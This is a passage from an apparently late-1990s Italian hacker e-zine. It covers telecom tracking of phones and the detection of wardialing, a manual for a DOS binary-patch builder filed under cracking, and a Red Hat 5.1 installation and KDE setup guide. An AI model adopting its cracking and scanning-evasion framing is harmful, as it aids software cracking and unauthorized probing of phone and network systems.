localita' non e' istantaneo, pero' ho reso l'idea. O almeno credo.

Trattiamo ora l'ultimo argomento: il monitoraggio dei telefoni cellulari
e di quelli residenziali.
Come tanti di voi ben sapranno il vs. cellulare e' un ottimo strumento per
rintracciarvi. Ad ogni vs. spostamento lui si aggancia ad una cella di un
ponte radio, ponte che ha logicamente un numero. Sembra incredibile da
credere, ma *tutti* i traffici e gli spostamenti di ogni possessore di
cellulare vengono loggati.
Ancora non ci credete, vero? Ci sono aziende "elette" da teleKom per ordinare
questi dati. Ma il bello e' che ognuna tratta *parte* di essi, come se fossero
dei semplici numeri statistici senza poter sapere di che cosa fanno parte.
Quindi, se per caso vi cacciate in un guaio *SERIO* e dico SERIO, non semplici
cazzate, siete incriminati ed avevate il cell acceso, volendo, laggiu' alla
teleKom, (e quindi anche le autorita') possono sapere se eravate in zona, ed
in quanti metri vi trovavate dal ponte radio (vedi l'eng field option del
motorola 8700 come esempio trattato in precedenza su BFi).
E' incredibile come si venga tenuti d'occhio.
Molti lo sapranno, ma c'e' qualcuno che non sa che teleKom Italia Mobile tiene
profili di ogni suo cliente, tenendo conto degli stili di vita (cellulare in
uso alle 5 am ad esempio), degli spostamenti, della affidabilita' di ogni
singolo cliente, etc..
E quelli residenziali? teleKom tiene sotto forma informatica dei "profili"
telefonici di ognuno di noi, quante telefonate riceviamo al giorno,
quante ne facciamo etc.. e questo e' molto pericoloso:
a qualcuno forse, dopo aver saputo che esistono numeri verdi per accedere
ad internet, potrebbe farsi balenare in testa di usare un bel wardialer
per effettuare uno scan dei numeri da 167-00001 a 167-99999 ad esempio.
Beh, non fatelo, perche' il vs. aumento di composizioni telefoniche
in un solo giorno, farebbe scattare il campanellino d'allarme laggiu' alla
teleKom; e non fidatevi della composizione casuale, i terminali adesso
hanno un software molto piu' complesso (ma ben piu' stabile di win95!)
che riesce a riconoscere la logica che usano i wardialer.
Ah, a proposito, fino a poco tempo fa, gli 167-87xxxxx erano *tutti*
sotto controllo, quindi fate voi.

Bhe, ora e' giunta l'ora, ci rileggeremo al piu' presto, o almeno spero!
Se volete insultarmi, o fare di peggio, fatelo a woodstock68@hotmail.com

Jaiss


==============================================================================
---------------------------------[ CRACKiNG ]---------------------------------
==============================================================================

-------------------[ PATCHER PR0 v0.3 t(est) e(valuation) ]-------------------
--------------------------------[ Technolord ]--------------------------------

                                   ]Manual[
                                   -======-
Overview
-======-
This is a program. It's userful for those who like to do file modifiers (in
other words, patches) for the stupid people out there. It is created for
being easy to use from both sides, the programmer (who creates the patch)
and the end-user (who hardly can double-clink on an icon). If you can
understand and program in BASIC, then you can use this program.

Author's comments
-===============-
This is a pre-release version. I'm releasing this mainly for betatesting
purposes. Use it at your own risk (hopefully it WILL work, but I can't
assure. Just be careful). Many features are missing since this software is
still under (heavy) construction. The "Pro" suffix is due to the fact I
released some time ago another version of a similar patcher (which shares
a lot in syntax and behaving). The "normal" version didn't allow any
expansion/plugin/whatever. This version allows the programmer a good 90%
freedom over the program. It allows dynamic recompilation. It allows
plugins. Plus more. That's why it's called "Pro".

Contacting the author
-===================-
Send bullshit to /dev/null
Send userful e-mails to l.raiser@deathsdoor.com
New updates can be found at http://softpj98.bbk.org/tools.html

Disclaimers?
-==========-
I was asked to create it, and so I did. It MAY cause great harm if
improprely used, so be careful. No implicit control is done about the
behaving of the created (output) files, so be just careful. The program
itself should do nothing evil, but I can't be sure. It's still under
construction, so BIG BUGS may appear at any time.

                             ]GETTING STARTED[
                             -===============-

What you will need to run this
-============================-
TASM & TLINK are mandatory. I created this program using tasm 5.0, so if
you have an earlier version you might have to filter the output. Let me
know if something goes wrong.
Also, make sure you have a .\TEMP directory or else the program will crash
badly (we don't want to know what it EXACTLY does, but that's BAD)

Installing
-========-
Just unpack the archive somewhere. Use directory names. It doesn't take
much physical space (sorry for the slack, maybe in a future release I'll
cover the problem). If you use a floppy I suggest launching a cache program
or you'll have to wait for a VERY long time for parsing.

What's inside?
-============-
With the package are included:
- This manual
- The parser (PPRO.EXE), which creates the output file
- A kernel (CORE\), which implements the virtual machine
- 2 GUIs (GUI\ and GUI\BARE\), which implement the screen functions
- A cryptographic scheme (CRYPT\), not yet implemented
- A compression scheme (COMPR\), not implemented
Explanation on how these work lies below

The first program
-===============-
Now, look at the file "EXAMPLE". It's a stupid, yet powerful, example to
demonstrate how the program works. It jsut takes a sequence and a predefined
position, checks if it's what it expects it to be and then patches it. The
program is fully commented, so there shouldn't be problems understanding
how it works. Straightforward and, most important, working :)
I will now explain the commands, their sintax and what they do.

                     ]THE EASY PART: CREATING THE CODE[
                     -================================-

What is needed to mess with this
-==============================-
Actually it doesn't include an editor (and it's not planned). Any text
editor will be fine. EDIT.COM or NOTEPAD.EXE will be just fine.

Create a text file, but do not use long file names (maybe supported in the
future) nor a file extension (support for extensions will be implemented in
near future). Place the commands (see below), save and compile. Remember to
place a CR on the last line (I'm working on it) or it might be not
interpreted correctly.

The commands
-==========-

Comments are preceded by "; ", and can be placed anywhere.

Explanation of the data types used:

NumberXX may be:
a)Any decimal number preceded by '.' or another decimal number.
b)An hexadecimal number preceded by 'x' or by another hexadecimal value.
  XX means a determined number of bits:  8 is a byte     [0-255]
                                        16 is a word     [0-65,535]
  (values may be signed, and the        24 are 3 bytes   [0-16,777,215]
  range is half-positive)               32 is a longword [0-4,294,967,295]

String may be:
a)Any sequence of characters delimited by ", ' or ` which do NOT contain
  the same delimiter and is begun and ended with the same char.
  For example, 'this isn't a string' is not valid because it has the same
  delimiter (') contained, while "It's a string" is perfectly legal.
  "Check this' isn't valid because it has different delimiters.
b)A number (see above). Note that it it's interpreted as ASCII code, not as
  characters, in other words, .78 is interpreted as ASCII 78 (char 'N'),
  not as '78'. Same applies for hexadecimal numbers.
  Hexadecimal numbers SHOULD (really!) have even length.
  Note also that numbers are written in LITTLE-ENDIAN order. Say, for
  example, you have to write the word "Hi" (ASCII x48 and x69,
  respectively), then you can write "Hi" (as ASCII values), write them one
  after another (x48 x69) or just concatenate them (x4869).
c)Any combination of the a) and b) intermixed by spaces for a length up to
  256 chars

[...|...]:
  A list of choices from which you have to select a choice. Eg. [A|B|C] you
  have to choose either A, B or C (either upper or lower case)

Conditional blocks:
  are logically of the type "IF <condition> THEN <do this> ELSE <do that>
  END". For each command is explained how it acts in detail.

Commands are in alpabetical order, grouped by section

SECTION GUI:
-==========-
MESG string
    writes the text. It just writes the string, and YOU will have to append
    .13 .10 (or equivalent) whenever you want to change line

TITLE string
    changes the title. Do not place a CR/LF anywhere. Replaces the old
    title, so you can use it anywhere and at any time.

SECTION KERNEL:
-=============-
BACKUP string
    copies the currently opened file's contents (you NEED to open a file
    before using this command) into the specified filename, erasing the
    previous contents, if already existing. Position into file is left
    unchanged by this operation.

CLOSE
    closes the previously opened file. Should be used only when there IS an
    open file :)

COMP string
    checks if the following sequence is matched in the file. The position
    in the file is left unchanged. Starts a conditional block which
    is followed by SUCCESS actions (sleaking loosely: if strings are equal
    do that follows ELSE do the other operations END)

ELSE
    is used ONLY in conditional blocks. Outside it doesn't do anything. The
    commands following are executed if the previous were not, and vice
    versa. May be used more than once in the same conditional block (I
    believe it's useless, but who knows?)

END
    closes the conditional block. An END closes ONE and ONLY ONE block.
    Forgetting to put ENDs will cause warnings, not errors, because
    -hopefully- you are just ignoring the failure case. If you get such an
    error, you SHOULD check your code anyway.

HAS_SIZE number32
    checks if the previously opened file has specified size. Note that the
    file position is moved to the END_OF_FILE. You really should OPEN (see:
    OPEN, IFOPEN) a file prior to checking file size. Starts a conditional
    block with SUCCESS operations (to be read as "if TheOpenedFile has_size
    indicated then do something ELSE do something else END")

IFOPEN string
    Tries to pen the file for read/write operations. You shouldn't open
    more than ONE file at a time (or your patch is likely to meet serious
    problems when run). Does not create a new file on failure. It starts a
    conditional block ("if the file can be opened with R/W permissions then
    open it and do the following ELSE do the other choice END")

OPEN string
    Tries to open a file for read/write, just like IFOPEN, but it DOESN'T
    check for success (and thus doesn't open a conditional block). To be
    used only if SURE the file exists.

SEEK [TOP|NOW|END] number32
    Moves the current position in the file from the position specified:
      TOP stands for the beginning of file (non-negative)
      NOW is the current position in the file (positive or negative)
      END is the position from the end of file (should be negative unless
          you want to enlarge the file)

WRITE string
    Writes the specified string to the file at current position. It doesn't
    move the file position nor checks for success or failure.

SECTION CRYPT and COMPR:
-======================-
Not yet implemented

                   ]THE FUN PART: CREATING YOUR COMMANDS[
                   -====================================-

WHAT???
-=====-
Yeah, not kidding :) I said you have complete control over this, and I'm
gonna explain you how to. A (preferably good) knowledge of ASSEMBLY
language is REQUIRED or you better keep your hands off :)
Sorry, the included commands are not commented.

Let's take a tour first
-=====================-
Enter in the directory CORE. It holds the kernel of the patch which you
generate. Take a look: you'll notice that file names are the same as
command names, plus some files which are not referred as commands. To allow
the parser to be easily modified I had to find a way to allow the users to
change the code. This is the way I've choosen, and it works, so be happy :)
Okay, now open a file, say INIT. You'll notice it's just ASM code, and in
fact it's just what is going to be compiled. The parser just includes the
file and the required files and calls the relative functions. Now you
should have understood the outlines of how it works, let's get into
business.

Creating a new command
-====================-
Supposed you have a good reason to create a command (say BACKUP command),
choose a name for it, say BACKUP. Make it long up to 8 chars and create a
file with the same name in the relative directory.
Choose the parameters. Say you just want it to take a filename, change the
extension and copy the contents. So you'll have a parameter, a string.
Now you can write the code for BACKUP. Create a procedure BACKUP and write
the code for it. You can use the other commands if you find it userful
(such as READ for reading from file and WRITE to copy the data). When you
have finished writing the code it's time to write the information for the
parser to understand this is a command and which parameters you are going
to take, plus more.

Parser commands
-=============-
;version version-string
    (not yet implementd) is used at compile-time to give credits to the
    creator and inform about version stuff

;require filename
    Instructs the parser that you need the file. The parser will take care
    that the file is going to be included, searching through the commands
    in the 4 cathegories (in order, current section, KERNEL, GUI, CRYPT and
    COMPR) and recursively parsing them (don't worry if you don't
    understand much, the parser will take care of most of the work)

;param parameters
    Tells the parser how it has to examine the rest of the line. More on
    this later on

;fetch procedure
    Instructs the parser that the parameters will be fetched via the
    specified function. In the core included with this package there are
    some functions which you can study/use/modify as you like.

;exec procedure
    Which procedure to call to execute the command.
    Commands without the ';exec' command will NOT be considered commands
    and therefore will give an error if you try to use them (actually the
    compiler NOT YET checks for this, but it WILL in the near future)

Command parameters
-================-
Optionals, they NEED to be written in the same order as you want them and
attached to each other (ie, no spaces between parameter definitions)

'>' Tells that the command starts an IF - ELSE - END block. In the included
    core the IF is executed via the function CONDITIO which takes AL = 00h
    for FALSE ("do not execute") statements and AL = FFh for TRUE
    ("do them") statements. It's REQUIRED to be the FIRST character in the
    ;param string

'X' Uniquely identifies the ELSE statement. Must not be used more than in
    one command for each patch. Also this must be first character.

'<' Identifies the only END statement. Like 'X' command

'1' (single byte)
'2' (short word)
'3' (24 bit value)
'4' (longword)
    Identify a parameter with n bytes. The output is BIG-ENDIAN (intel-style)

'S' String in PASCAL style, is compiled as <len8><ref16>, where len8 is a
    byte containing the number of characters in the string (there is no
    NULL terminator) and ref16 is the 16 bit pointer to the string
    (DS:ref16). The string is NOT null-terminated. If this is the case, use
    'Z' instead. Note that 'S' cannot be followed by any other parameter
    (sorry). GUI messages are sent as 'S'.

'Z' ASCIIZ string. It is compiled as <ref16>, in opposition to PASCAL style
    (see 'S'), you don't know the length in advance. File names need to be
    of type 'Z'. Like 'S', you don't have a chance to put any other
    parameter after this (it would be inglobated).

'[', '|', ']' a list of literal choices, in uppercase. May NOT be nested
    and may NOT contain '|' nor ']' characters. The '|' symbol is used to
    delimitate single choices and ']' is to close the sequence. Is compiled
    as <int8> from 0 (first choice) to n-1 (last choice). For example [A|B|C]
    will give 0 for A, 1 for B and 2 for C

Fetching
-======-
With the core in this package, DS:SI points to the opcode. The FETCH
routine will call the appropriate function and expects on return that DS:SI
points to the next opcode. Parameters are written accordingly to the ;param
command, except that for strings is written a reference (pointer) to the
memory instead of being written just next to the opcode (which itself is
1-byte long)

Executing
-=======-
There are no limitations on execution routines. The given core keeps BX for
file handle, SI as program counter for the virtual machine and requires SP,
SS and DS to be left alone. Often routines assume also CX and DX to be left
unchanged, so you better save all changed registers.

                   ]EVEN MORE FUN: CREATING YOUR PATCHER[
                   -====================================-

What to keep in mind
-==================-
Each section is thought independent to each other, except for some
procedures. If you're going to create -say- a GUI, you'll have to provide
these functions so that they can be safely exchanged between different
versions/plugins.

Predefined things:
-================-
VMCODE label byte
    holds the opcodes

VMDATA label byte
    keeps the strings referenced and lies just after VMCODE

VMBYTES dd 256 dup (?)         (** NOT YET IMPLEMENTED **)
    1024 bytes to be used for variables

CAN_WRITE_HERE label byte
    A buffer where you can (almost safely) write some stuff. It's used, for
    example, as a buffer for COMP command

_ELSE and _END
    EQUs defined at compile-time, uniquely identify which values are used
    as END and ELSE commands

STARTUP:
-======-
Modules are linked (initialized) in the following order:
- COMPR  (for decompressing, if not added by the compressor)
- CRYPT  (should de-crypt the crypted code)
- GUI    (should make a jmp KERNEL_INIT on completion)
- KERNEL
Each module MUST provide the INIT file (even empty)

Section KERNEL
-============-
Required is the label KERNEL_INIT which is to be called by the GUI module
Required are the fetch routines used by the GUI (unless also provided by GUI)
Required is a function NONE which just RETs
Conditionals have to use _ELSE and _END equals

Section GUI
-=========-
Required is the TITLE command
Required is the MESG command
Required is the PROGBAR function (called by KERNEL to show the percentuage
    of the patch executed

Section CRYPT
-===========-
Requires a program called CRYPT which takes the filename as parameter and
    crypts it, keeping it executable

Section COMPR
-===========-
Requires a program called COMPR which takes the filename as parameter and
    compresses it, keeping it executable (eg. PKLITE)

                               ]CHANGES LOG[
                               -===========-

Changes from Patcher
-==================-
* Included source code for the virtual machine
+ Added a GUI to the program
+ Added (incomplete) plugin support
+ Added a GUI to the VM
+ Added dynamic recompilation of the VM
- Precompiled machine cannot be used anymore
- Removed the (userful) '!' command
- Requires TASM & TLINK
- Disk-intensive
- Removed check for multiple file opens

Known problems and issues
-=======================-
! The program NEEDs a directory called TEMP to correctly work


==============================================================================
--------------------------------[ MiSCELLANE0US ]-----------------------------
==============================================================================

-----------------------------------[ REDHAT ]---------------------------------
-----------------[ PARTE I : iNSTALLAZi0NE E C0NFiGURAZi0NE ]-----------------
----------------------------------[ |scacco| ]--------------------------------

Ciao ragazzi, eccoci ancora qui per un altro mitico articolone per BFi.
Questa volta vi insegnero' a installare e configurare un sistema Linux con
le palle (Red hat 5.1 ... e gia' qui le palle cadono...).
Sto usando il Linux toolkit di agosto 98 perche' non ho i soldi per la
distribuzione ufficiale.
Vado nel drive del CDROM ed utilizzo il programma View per mettere su
dischetto l'immagine di boot, scelgo RAWBOOT IMAGE premo INVIO e appare:
"Enter target diskette drive:" metto "a" INVIO
P.S. Devo inserire nel drive un dischetto formattato - affermazione
prevedibile -
Il programma comincera' a generare l'immagine di boot su dischetto...
attendere prego... pare abbia finito... premo INVIO... infatti ha
finito (un piccolo difetto di programmazione).
Esco dal programma, estraggo il CDROM e mi reco sul nostro computer ancora
per poco vergine.
Inserisco dischetto e CDROM e avvio il sistemone.
                     WELCOME TO RED HAT LINUX
                     (comincia il calvario)
Premete INVIO e parte il vero e proprio setup
Loading initrd.img... boot failed
                     (cazzo succede?!?)
Riavvio il PC sempre col dischetto dentro...boot failed ancora
            (e il nervoso sale...manteniamo la calma!!!)
Mi reco nuovamente sul PC precedente e ricreo il dischetto di avvio.
(adesso la mia morosa, che sta anche scrivendo il testo su carta, mi da' un
bacino di conforto)
porc. putt. madonn. troi... 9.126 byte in settori danneggiati!!! grrr..
Non comprate i dischetti Magnex MF2HD! Formatto un altro dischetto...
Questo funziona, da notare che sulla scatola dei dischetti c'e' scritto
100% error free (sto paio di palle).
Finito, torniamo sul nostro PC ancora vergine (e aspettiamo di vedere se
funziona).
Siamo nuovamente al setup (e' un calvario, ve l'avevo detto, ascoltate gli
esperti!).
PARTITO!
Welcome to Red Hat Linux (scritto ovunque, buon segno!)
premete INVIO
Bisogna scegliere una lingua, se non siete masochisti scegliete INGLESE
(English... se non avevate capito questo lasciate perdere!).
Scegliamo il tipo di tastiera, vi consiglio it, che e' quella standard per noi
italiani.
Install method: usate, ovviamente, local CDROM. Premete OK e ancora OK.
In second stage Install (la prima parte e' andata)
Intallation path: scegliete Install
SCSI configuration: fate voi, io non ce l'ho quindi premo NO
disk setup: ma usiamo il Disk Druid, anche se personalmente preferisco
la command line (fdisk)
Current disk partition: io ho:
hda1 di 810 Mb
hdb1 di 514 Mb
e utilizzo hda1
premo INVIO su hda1 e mi dice:
mount point:  metto / e premo OK.
The mount / is illegal.
Ci siamo dimenticati di dichiarare la partizione come Linux Native
(ovviamente non sono cosi' coglione, ma vi sto facendo vedere gli errori che
potreste fare!).
Seleziono HDA1 e premo Delete, questo cancella la partizione HDA1, non vi
preoccupate, adesso la ricreeremo.
Andiamo su Add, appare:
mount point: mettere /
Size (megs): dobbiamo considerare che dovremo creare una mini partizione per
lo swap. I miei calcoli empirici mi suggeriscono di lasciare liberi circa
30 Mb. Quindi metto 780 (lo so benissimo che 850-30 fa 820 ma Linux mi lascia
disponibili solo 811 Mb quindi fate 811-30 e vedrete che non mi sono sbagliato
di molto).
type: Linux Native
OK
Facciamo nuovamente Add, lasciate mount point vuoto, mettete size (megs): 30
type: linux swap
PERFETTO!
E anche quest'operazione e' completata! Premete OK.
Save change to partition table? Yes
Active wap space: dovrebbe essere tutto correttamente settato, in quanto avete
dichiarato una sola parrtizione di swap.
Premete OK e aspettate che formatti e configuri la partizione.
Formatting... (se avete la vostra morosa nelle vicinanze, nell'attesa potete
sbaciucchiarla a piacere!).
Scanning package: questa breve operazione fa rilevare al setup i pachetti
disponibili sul CDROM, ma sara' un argomento che affronteremo piu' avanti.
Partitions to format: con la barra spaziatrice selezionate /dev/hda1
(nel mio caso era quello l'hard disk principale).
Potete anche selezionare " check for bad blocks " se avete il sospetto che vi
possano essere settori danneggiati (allora sono cazzi vostri!). Premete OK.
Components to install: qui arriva il problema, non so cosa vi possa
esattamente servire, per ora mi limitero' ad installare una normale
hacking workstation con il supporto grafico.
Printer support: no grazie, non ho la stampante, se qualche buonanima me la
volesse comprare sono a disposizione.
Xwindow system: si', l'ho appena detto.
mail/www/news tools: si', vi saranno utili.
DOS/Windows connectivity: selezionateli, potrebbe sempre venir utile.
File managers: secondo voi? Si', certo!
Graphics manipulation: robetta tipo gimp, per ora non mettiamolo.
Xgames: i giochi per X, io non li metto perche' voglio risparmiare spazio, voi
fate come volete.
Console games: giochi per la shell (vedi precedente).
X multimedia support: si', grazie, ascoltare i cd e' molto rilassante,
soprattutto se sono punk, buon punk (la morosa concorda).
Console multimedia: stesso discorso.
Print server: uhmmm...
Networked & Dialup workstation: si', entrambi.
News server: no.
Nfs server. uhmmm... nemmeno quello.
Smb samba connectivity: mettetelo se vi volete divertire con qualche netbios
in giro per la rete (io lo metto...ssshhh!!! non ditelo ad alta voce!!!).
Ipx/netware connectivity: no, non mi serve.
Anonymous ftp/gopher server: si', vi verra' utile per scambiare file con amici
e nemici.
Web server: no grazie.
DNS name server: nemmeno questo grazie!
Post gres sql server: nemmeno.
Network management workstation: si'.
Tex document formatting: no grazie.
Emacs x e non: non lo uso.
C, libraries, C++, X development: si', ovviamente ci saranno abbastanza utili.
Basta, premete OK. Premete ancora OK: parte la formattazione di /dev/hda1
(fumatevi 2 sigarette, prendetevi un caffe', mangiatevi una pizzettina e
aspettate che abbia copiato tutti i file... ovviamenete, sempre se avete la
vostra morosa vicino, sapete benissimo cosa potete farci senza che ve lo stia
a dire... noi intanto procediamo... VOLTATEVI!!!).
Sto notando che nella distribuzione 5.1 ci sono un sacco di pacchetti in piu'
rispetto alla 5.0 di dev, interessante!
Wow! Mi installa addirittura il Netscape Navigator di default! Carina
quest'idea!
Ah installa anche tutte le librerie necessarie per l'enlightenment, un gestore
per Xwindiws molto "hacker", chi l'ha visto sa perche' lo sto dicendo.
Comunque ho intenzione di installare il KDE, perche' e' un po' piu'
professionale e ha un sacco di programmi comodi sia per la gestione del
sistema, sia per il chat, per il multimedia ecc... anch'io sono innamorato
della shell, ma a volte un giro nella GUI non fa male.
Fatto!
Probing mouse: trovato sulla porta cua0.
---Facciamo un breve excursus:---
Per chi non lo sapesse cua0 sta per COM1, cua1 sta per COM2 ecc.
ttyS0 equivale a cua0 e cosi' via...
hda e' l'hard disk IDE primario, hda1, hda2 ecc. sono le partizioni presenti.
hdb e' l'hard disk IDE secondario, per le partizioni stesso discorso.
hdsa e' l'hard disk SCSI primario.
tty1, tty2 ecc. sono i terminali locali.
ttyP0, ttyP1 ecc. sono i terminali remoti.
---fine excursus---
Continuiamo il nostro setup.
Mi ha rilevato il mouse sulla porta cua0, premo Ok.
Bisogna selezionare il tipo di mouse: seleziono Microsoft compatible (serial),
il mio mouse e' un Trust, figuriamoci se c'era!
Seleziono l'opzione Emulate 3 buttons? e premo OK. Dice mouse port, io metto
/dev/cua0 e premo OK.
PCI probe: che culo! Mi ha rilevato subito la scheda grafica!
PCI entry: tg 9440
Xserver: svga
(spero abbiate questo culo anche voi, altrimenti sono cazzi :) )
premo OK.
Monitor setup: seleziono CUSTOM (il mio cesso di monitor non e' nella lista).
premo OK.
nuovamente OK.
Seleziono supervga 800*600 e premo OK.
Monitor setup (continued) metto 50-70
(non so esattamente perche', ma da quando ho iniziato ad installare Linux ho
usato sempre quello e non mi si e' mai bruciato il monitor e come diceva un
famoso allenatore: "Squadra che vince non si cambia").
premo OK.
Screen configuration: probe
premo OK.
Probing finished: mi ha dato dei risultati schifosi, quindi uso let me choose
per sistemarli.
Seleziono 16 bit 640*480 premo OK.
Andro' poi a configurarlo manualmente per aumentare la risoluzione.
Network configuration: no, se avete una lan vi conviene farlo in un momento
successivo manualmente, scegliete no.
Configure timezones: mettete Europe/Rome
OK.
Services: togliamo tutti i demoni non necessari, quindi togliamo atd, crond,
lpd, nfsfs, pcmcia, portmap, random, sendmail, smb, snmpd e premete OK.
Configure printer: NO! Non la ho la stampante, non mi rodere cosi'!
Root password: inserite la vostra password preferita. Consiglio: lettere
maiuscole, minuscole e numeri. ***MASSIMO 8 CARATTERI***
Premete OK.
Boot disk: no grazie, uso LILO.
LILO installation: /dev/hda   master boot record
premete OK.
Premete ancora OK.
Boot able partition: dovrebbe essere gia' settato, premete ancora OK.
DONE.
Congratulations, installation is complete!
Basta applausi grazie, basta basta...sono un tipo modesto!
Estraete il dischetto con estrema dolcezza e premete ancora OK.
Il computer si riavvia.
Attendete qualche secondo...etvoila'... la nostra Linux adventure comincia!
Eccoci al login prompt:
localhost login: scrivete root e la vostra password
etvoila': eccovi nella shell di Linux.... baboooommmm!!!!!!...
Partiamo subito con la parte piu' incasinata.
Scrivete Xconfigurator, premete OK, ancora una volta OK e selezionate supervga,
1024*768 ecc. Premete OK. Sempre 50-70 OK.
E poi don't probe.
Video memory: 1Meg, non ho abbastanza soldi per comprare una scheda grafica
migliore.
Premete OK.
Premete ancora OK.
8 bit: 800*600
16 bit: 800*600
OK.
Ancora OK.
E dovreste essere nuovamente in shell.
Scrivete startx. INVIO.
Ecco a voi i mitico Xwindows.
Ora che siete in X (che d'ora i poi sara' l'abbreviazione di Xwindows)
configuriamo il collegamento a Internet tramite il ppp.
Sulla sinistra dovreste vedere delle icone, clikkate su quella dove appare un
telefono (modem configuration).
Selezionate la porta del vostro modem, nel mio caso cua1.
Questo programma creera' un link tra /dev/cuax (dove x sta per un numero) e
/dev/modem.
D'ora in poi il device del vostro modem sara': /dev/modem. Premete OK.
Sempre nelle iconcine alla vostra sinistra ce n'e' una con tanti computerini
collegati assieme (network configuration), clikkate.
Qui servono alcuni parametri del vostro provider, se non li avete datevi una
mossa e procurateveli.
hostname: scacco
(d'ora in poi usero' dati fittizi per motivi di anonimato)
domain: microsoftsux.com
search for hostname in additional domain: lasciatelo vuoto
name servers: 100.666.666.666
clikkate su hosts: lasciate tutto come impostato
clikkate su interfaces: clikkate su Add, selezionate ppp e premete OK.
phone number: 666 (Sex Pistols rulez)
ppp login name: Bill
ppp password: sux
clikkate su customize, clikkate su communication:
modem init string: io uso ATX3E0V1
il resto lo lasciate inalterato.
Per quanto riguarda lo script di login ogni porvider utilizza un metodo
proprio, informatevi e modificatelo.
Premete DONE poi SAVE e ancora SAVE.
Testiamo se tutto funziona.
Andate in interfaces, selezionate ppp0 e premete Activate.
uff... tutti i modem occupati sul mio provider!!!
                   ---pausa cena---
Eccoci al ritorno dalla cena, riproviamo...
Il modem si e' connesso, controlliamo se le configurazioni sono corrette
facendo un ping ad un qualsiasi host. Andate nel terminale e scrivete:
"ping home.netscape.com".
Se l'host risponde, complimenti, siete connessi ad Internet.
Adesso installiamo in Window Manager.
Aprite Netscape andando su Start-Programs-Networking_Netscape Communicator e
andate a:
ftp://ftp,flashnet.it/pub/ftp.kde.org/kde/stable/1.0/ditribution/rpm/RedHat5.1/i386/binary
e scaricate tutti gli rpm.
Nota tecnica: per scaricare gli rpm o settate rmp save to disk negli helpers
di Netscape oppure per i pigri come me premete SHIFT e tenendolo premuto
clikkate sul file.
Mentre scarichiamo tutti i file, che e' una procedura abbastanza lunga, per
chi ce l'ha puo' seguirmi nella configurazione della scheda sonora. Io ho una
SoundBlaster AWE32 (giusto per informazione).
Aprite un xterm (un terminale) e scrivete:"sndconfig" premete INVIO.
Wow! Me l'ha riconosciuta al primo tentativo!
Model: Creative Sb32 pnp
Premete OK.
Select your card: lascio quella di default.
Premo OK.
Card settings: non me li ricordo mai, vado per tentativi.
Tutto funziona, ho sentito il sound sample, wow!
Adesso che funziona mi ascolto un po' di musica, ovviamente punk:
Agnostic Front - Raw Unleashed
                      ---pausa notte---
Rieccoci! Avete gia' scaricato tutti i file necessari? Spero di si'.
Ora inizieremo ad installare i vari pacchetti. Andate nella directory
dove avete tutti gli rpm del kde e scrivete:"rmp -i kdesupport*"
(dove * e' il completamento del nome del file).
Questa operazione installera' il pacchetto support nella directory /opt/kde.
Poi scrivete:"rpm -i kdelibs*".
Osservazione: se non sono installate le librerie qt e' necessario
installarle prima di ogni altra cosa con i comandi: "rmp -i qt-1.4*"
e "rmp -i qt-devel-1.4*".
Ora procediamo a installare il pacchetto base del kde, quindi scrivete:
"rpm -i kdebase*", potrebbe darvi un errore in quanto necessita delle librerie
ncurses versione 3.0, ma RedHat 5.1 esce con l versione 4.0 quindi vi
conviene scaricare il pacchetto base kde in sorgente e quindi compilarlo
manualmente come sto facendo io. In questo modo installate tutti gli altri
pacchetti come multimedia, network, admin, ecc...
Ora che tutto e' installato dovremo andare a modificare il file di
configurazione in modo tale che possa attivare il kde come default window
manager.
Prima di tutto andiamo ad inserire la directory /bin del kde nel path.
Andate nella directory /etc, dovreste vedere un fle chiamato profile,
scrivete: "vi profile". La sesta riga contiene il path, andate col cursore
prima delle ultime virgolette, premete INS e scrivete:
":/opt/kde/bin" premete ESC e scrivete: ":wq" INVIO.
Entrate nuovamente nel file profile inserendo la riga KDEDIR=/opt/kde e nella
riga di export aggiungete la voce KDEDIR, salvate e uscite (:wq).
Passiamo a editare il vero e proprio file di configurazione chiamato xinitrc.
Questo file si trova nella directory /etc/X11/xinit/xinitrc .
Andate in questa directory e copiate il file xinitrc.bak
(cp xinitrc xinitr.bak).
Tramite vi editate il file xinitrc. Ora dovrete cancellare alcune righe,
cercate la riga con la scritta: "start some nice programs".
Sotto questa riga troverete tutte le operazioni per inizializzare il Window
Manager di default che nel vostro caso e'l'fvwm.
Cancellate la riga dove appare xclock tramite il comando del (delete).
cancellate inoltre le due righe relative all'xterm e anche le tre righe
successive relative al browser. Editate la riga successiva andando ad inserire
al posto di /usr/X11R6/bin/fvwm il path /opt/kde/bin/startkde , nella riga
successiva al posto di exec fvwm scrivete exec startkde e al posto di exec
twm scrivete exec fvwm , salvate e uscite.
Andate nella directory /opt/kde/bin e scrivete: "chmod +x startkde", in questo
modo avete reso eseguibile lo script di inizializzazione.
Ora uscite da Xwindows e riavviate il sistema tramite il comando reboot.
P.S.: Incrociate le dita.
Rieccoci al prompt di Linux, scrociate le dita e scrivete startx (se siete
cosi' bravi da farlo con le dita incrociate allora non avete bisogno di questo
manuale).
Ops, non funziona, siamo di nuovo nel vecchio Window Manager. Ci siamo
dimenticati il file Xclients, editiamo nuovamente il nostro file xinitrc e
cancelliamo tutti i riferimenti a .Xclients e Xclients, togliete l'else,
salvate e uscite.
Scrivete nuovamente startx...etvoila'..ecco a voi il kde...basta applausi,
grazie, siete troppo gentili!
Vi comunichera' che sta creando alcune directory, premete sempre OK ed eccovi
finalmente all'interno del vostro nuovo window manager, date un bacino alla
vostra morosa (sempre se l'avete vicina, ovvio) la quale vi dira':
"Bravo amore!!!" (ma non e' vero, perche' seguendo la mia guida anche Bill
Gates riuscirebbe ad installare Linux).
Ora configuratevi il kde a piacere, se non siete idioti dovreste riuscirci,
anche perche' c'e' l'help in italiano.
Dopo questo "breve" excursus iniziale, affrontiamo la parte relativa alla
sicurezza del vostro Linux.
Facciamo in modo che qualche vostro amichetto bastardo non riesca ad hackerarvi
o a farvi danni permanenti.
                   ---pausa pipi'---
Rieccomi!!!
Prima di tutto andiamo ad inserire una cosina abbastanza interessante: entrate
nella directory /etc, editate il file issue e dopo Manhattan scrivete Powered
by |scacco|, fate la stessa cosa per issue.net .
Riavviate il sistema. Ops! Cosa e' successo? La nostra frase non e' apparsa.
Entrate nella directory /etc/rc.d che contiene i file di inizializzazione.
Se editate rc.local noterete che ad ogni avvio i file issue e issue.net
vengono rigenerati. Per questo motivo andiamo ad inserire dopo RedHat
Linux R la frase:"Powered by |scacco|".
Riavviamo il sistema.
Etvoila', funziona!
Andate nella directory /etc, editate i file inetd.conf. Questo file contiene
l'elenco dei demoni attivi asociati alle rispettive porte, andiamo a
disabilitare tutti quelli inutili.
